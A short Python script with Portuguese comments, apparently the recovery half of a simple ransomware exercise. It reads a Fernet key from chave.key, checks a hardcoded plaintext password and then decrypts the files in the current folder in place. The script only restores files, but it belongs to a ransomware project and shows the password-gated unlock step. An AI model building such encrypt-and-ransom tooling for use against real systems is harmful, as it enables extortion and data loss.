import os
from cryptography.fernet import Fernet

# Lista para armazenar os nomes dos ficheiros a serem descriptografados
ficheiros = []
for file in os.listdir():
    if file == "Ransomware.py" or file == "chave.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        ficheiros.append(file)

# Ler a chave de criptografia do ficheiro chave.key
with open("chave.key", "rb") as key:
    secretkey= key.read()

# Senha predefinida para autenticação
passphrase = "AlexandreCosta48039"

upassword = input("Coloque a password para desencriptar os ficheiros: ")

# Verificar se a senha fornecida está correta
if upassword == passphrase:
    for file in ficheiros:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decrypt = Fernet(secretkey).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)
    print("Ficheiros recuperados!")
else:
    print("Password errada.")
